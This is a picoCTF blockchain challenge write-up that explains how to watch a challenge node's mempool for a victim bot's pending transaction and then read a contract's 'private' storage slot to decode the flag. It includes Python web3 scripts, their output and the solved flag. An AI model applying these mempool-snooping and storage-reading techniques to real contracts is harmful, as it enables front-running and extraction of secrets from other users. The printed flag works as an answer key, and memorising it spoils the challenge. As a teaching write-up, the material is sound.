# Blockchain CTF Writeup

## Challenge Description
A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag to anyone who can provide the correct pre-image to a specific hash.
Our sensors indicate that a "Victim Bot" has found the answer and is currently trying to submit it, but they are being very stingy with their gas price.
Additional details will be available after launching your challenge instance.

## Solution

The hint given mentions looking at the pending transactions in the mempool.
The node provided is at `candy-mountain.picoctf.net:64869`.
The `FrontRunning.sol` contract reveals there is a `solve(string memory solution)` function, which accepts the correct pre-image that hashes to a target hash. Once solved, it will set `revealed = true` and emit an event with the true `flag`, which is stored as a `string private flag` in the contract state.

Since the Victim Bot is trying to submit the solution but with a stingy gas price, the transaction sits in the mempool waiting to be mined. We can inspect the pending block to see the destination address of the contract and the solution string.

We can inspect the pending block using Python and the `web3` library to find the victim's transaction:

```python
import time
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://candy-mountain.picoctf.net:64869'))
print("Connected:", w3.is_connected())

for _ in range(30):
    try:
        pending = w3.eth.get_block('pending', full_transactions=True)
        if pending.transactions:
            print("Found transactions!")
            for tx in pending.transactions:
                print("TX Hash:", tx.hash.hex())
                print("To Contract:", tx.to)
            break
    except Exception as e:
        pass
    time.sleep(1)
```

Running this code successfully captured a pending transaction:
```
Found transactions!
TX Hash: f8ee30502eb373fd7e4d2beefd1902262717156b949bde3533a863f0f896e1f7
To Contract: 0x5FbDB2315678afecb367f032d93F642f64180aa3
```

Now we know the contract is located at `0x5FbDB2315678afecb367f032d93F642f64180aa3`. Since we are running the local node, we can just read the contract state directly without even solving the challenge ourselves.
The `MempoolChallenge` contract variables:
- `address public owner` (20 bytes) -> Slot 0
- `address public studentAddress` (20 bytes) -> Slot 1
- `string private flag` -> Slot 2
- `bool public revealed` -> Slot 3

Let's read Slot 2 from the node:

```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://candy-mountain.picoctf.net:64869'))
contract_addr = '0x5FbDB2315678afecb367f032d93F642f64180aa3'

slot2 = w3.eth.get_storage_at(contract_addr, 2).hex()
print(f"Slot 2: {slot2}")
```

This returns:
`Slot 2: 7069636f4354467b6d336d7030306c5f68333173745f30333264626162317d3e`

Solidity stores short strings right-padded with their length stored in the lowest-order byte. The length is encoded as `length * 2`.
The last byte `0x3e` in decimal is 62. `62 / 2 = 31`, meaning the string is 31 bytes long.

We can decode the hex string excluding the length byte:
```python
slot2 = "7069636f4354467b6d336d7030306c5f68333173745f30333264626162317d3e"
print(bytes.fromhex(slot2[:-2]).decode())
```

This yields the real flag:

```
picoCTF{m3mp00l_h31st_032dbab1}
```

## Flag
`picoCTF{m3mp00l_h31st_032dbab1}`
